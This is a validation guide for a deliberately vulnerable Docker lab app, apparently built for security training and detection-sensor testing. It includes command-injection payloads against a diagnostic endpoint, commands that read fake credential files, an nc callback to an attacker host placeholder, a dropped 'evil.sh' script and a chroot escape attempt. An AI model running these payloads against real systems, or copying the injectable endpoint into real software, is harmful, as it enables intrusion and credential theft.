# VendorQuote Testing & Validation Guide

This document provides testing steps to verify the VendorQuote container is working correctly.

## Pre-Deployment Validation

### 1. Verify File Structure

```bash
ls -la vendorquote/
ls -la vendorquote/app/views/
ls -la vendorquote/config/
ls -la vendorquote/keys/
ls -la vendorquote/data/
ls -la vendorquote/backup/
```

**Expected:** All directories and files present as shown in README.

### 2. Check Fake Sensitive Data

```bash
# Verify fake credentials exist
cat vendorquote/config/.env
cat vendorquote/config/gcp-service-account.json
cat vendorquote/config/slack.json
cat vendorquote/keys/vendorquote-internal.pem

# Verify fake business data
head vendorquote/data/vendor_pricing_2026.csv
head vendorquote/data/discount_exceptions.csv
head vendorquote/data/procurement_notes.txt
```

**Expected:** All files contain fake data clearly marked as training/fake.

## Build Validation

### 3. Build the Image

```bash
cd vendorquote
./build.sh
```

**Expected output:**
- Build completes without errors
- Image tagged as `vendorquote:worstcase`

### 4. Verify Image Exists

```bash
docker images | grep vendorquote
```

**Expected:**
```
vendorquote   worstcase   <image_id>   <time>   ~500MB
```

### 5. Inspect Image Layers

```bash
docker history vendorquote:worstcase
```

**Expected:** See layers including:
- FROM node:14
- apt-get install commands
- ADD/COPY instructions
- EXPOSE 80

## Runtime Validation

### 6. Start the Container

```bash
./run.sh
```

**Expected:**
- Container starts successfully
- Named `vendorquote`
- Port 80 mapped

### 7. Verify Container is Running

```bash
docker ps | grep vendorquote
```

**Expected:**
```
CONTAINER ID   IMAGE                    ...   PORTS                 NAMES
<id>           vendorquote:worstcase    ...   0.0.0.0:80->80/tcp   vendorquote
```

### 8. Check Container Logs

```bash
docker logs vendorquote
```

**Expected output:**
```
VendorQuote running on port 80
Environment: production
```

## Application Validation

### 9. Test Health Endpoint

```bash
curl http://127.0.0.1/healthz
```

**Expected:** `ok`

### 10. Test Landing Page

```bash
curl -I http://127.0.0.1/
```

**Expected:**
```
HTTP/1.1 200 OK
Content-Type: text/html
```

### 11. Test All Routes

```bash
# Dashboard
curl -s http://127.0.0.1/ | grep -i "VendorQuote"

# Quotes page
curl -s http://127.0.0.1/quotes | grep -i "TechSupply"

# Approvals page
curl -s http://127.0.0.1/approvals | grep -i "EXC-2026"

# Support page
curl -s http://127.0.0.1/support | grep -i "diagnostic"
```

**Expected:** Each command returns matching content.

## Vulnerability Validation

### 12. Test Command Injection (Basic)

```bash
curl -X POST http://127.0.0.1/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"whoami"}'
```

**Expected response:**
```json
{"status":"success","output":"root\n"}
```

### 13. Test Command Injection (Multi-command)

```bash
curl -X POST http://127.0.0.1/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"id && whoami && hostname"}'
```

**Expected:** Output showing UID 0 (root), username "root", and container hostname.

### 14. Verify Secrets Access

```bash
curl -X POST http://127.0.0.1/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"cat /app/config/.env"}'
```

**Expected:** Fake environment variables displayed.

```bash
curl -X POST http://127.0.0.1/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"cat /app/config/gcp-service-account.json"}'
```

**Expected:** Fake GCP service account JSON displayed.

### 15. Verify Tool Availability

```bash
curl -X POST http://127.0.0.1/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"which bash curl wget nc"}'
```

**Expected:** Paths to all four tools.

### 16. Verify Root Execution

```bash
docker exec vendorquote id
```

**Expected:**
```
uid=0(root) gid=0(root) groups=0(root)
```

### 17. Verify Writable Filesystem

```bash
docker exec vendorquote bash -c 'echo test > /tmp/write-test && cat /tmp/write-test'
```

**Expected:** `test`

## Security Finding Validation

### 18. Check for Expected Image Issues

**Manual inspection checklist:**

- [ ] **No USER instruction**: `grep -i "^USER" Dockerfile` returns nothing
- [ ] **Uses ADD**: `grep "^ADD" Dockerfile` returns matches
- [ ] **Port 80 exposed**: `grep "EXPOSE 80" Dockerfile` returns match
- [ ] **Runs as root**: `docker exec vendorquote whoami` returns `root`
- [ ] **Fake GCP creds present**: `/app/config/gcp-service-account.json` exists in image
- [ ] **Fake Slack creds present**: `/app/config/slack.json` exists in image
- [ ] **Old Node version**: Image based on `node:14`

### 19. Check SUID Binaries (Optional)

```bash
docker exec vendorquote find / -perm -4000 2>/dev/null | head
```

**Expected:** Some inherited SUID binaries from base image (su, mount, etc.)

## Lab Scenario Validation

### 20. Test Callback Capability (Requires Kali)

On Kali machine:
```bash
nc -lvnp 4444
```

From attacking machine:
```bash
curl -X POST http://<APP_IP>/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"echo vendorquote-checkin | nc -nv <KALI_IP> 4444"}'
```

**Expected:** Kali receives the "vendorquote-checkin" message.

### 21. Test Drift Detection (Local Script)

```bash
docker exec vendorquote bash -lc 'cat > /tmp/evil.sh <<EOF
#!/bin/bash
echo drift-demo
date
EOF
chmod +x /tmp/evil.sh
/tmp/evil.sh'
```

**Expected:** Script executes, prints "drift-demo" and current date.

### 22. Test Controlled Escape Attempt

```bash
docker exec vendorquote bash -lc 'chroot /'
```

**Expected:** Command attempts to execute (may succeed or fail depending on environment, but should trigger Falcon detection if sensor is running).

## Browser-Based Testing

### 23. Visual Validation

Open in browser: `http://<HOST_IP>/`

**Check:**
- [ ] Corporate-style header with "VendorQuote" branding
- [ ] Navigation bar (Dashboard, Quotes, Approvals, Support)
- [ ] User context shows "contractor-jdoe"
- [ ] Dashboard has three cards linking to features
- [ ] Quick stats table displays

### 24. Test Each Page

- [ ] **Quotes page** (`/quotes`): Shows table of 12 vendor quotes
- [ ] **Approvals page** (`/approvals`): Shows 5 exception requests
- [ ] **Support page** (`/support`): Has textarea and submit button

### 25. Test Vulnerable Form

On the Support page:
1. Enter: `hostname`
2. Click "Run Diagnostic"
3. **Expected:** Container hostname appears in output box

## Performance Validation

### 26. Response Time Check

```bash
time curl -s http://127.0.0.1/ > /dev/null
```

**Expected:** < 500ms for local requests

### 27. Concurrent Request Test

```bash
for i in {1..10}; do
  curl -s http://127.0.0.1/healthz &
done
wait
```

**Expected:** All return `ok`

## Cleanup Validation

### 28. Stop Container

```bash
./stop.sh
```

**Expected:**
- Container stopped and removed
- Port 80 released

### 29. Verify Cleanup

```bash
docker ps -a | grep vendorquote
```

**Expected:** No output (container removed)

## Troubleshooting

### Build fails

```bash
# Check Docker daemon
docker info

# Check disk space
df -h

# Clean up old images
docker system prune -a
```

### Port 80 in use

```bash
# Find process using port 80
sudo lsof -i :80

# Use alternative port
docker run -d --name vendorquote -p 8080:80 vendorquote:worstcase
```

### Cannot access from remote host

```bash
# Check container is listening on all interfaces
docker exec vendorquote netstat -tlnp | grep 80

# Check AWS security group allows inbound port 80

# Verify public IP
curl http://169.254.169.254/latest/meta-data/public-ipv4
```

## Success Criteria

The VendorQuote container is ready for lab use when:

- [x] All files created successfully
- [x] Image builds without errors
- [x] Container runs and binds to port 80
- [x] All routes return expected content
- [x] Vulnerable endpoint executes commands
- [x] Fake secrets are accessible
- [x] Container runs as root with write access
- [x] Required tools (bash, curl, wget, nc) are present
- [x] UI displays properly in browser
- [x] Lab scenario commands work as expected

---

**Next Steps:** Deploy to lab environment and integrate with Falcon sensor for full detection coverage.
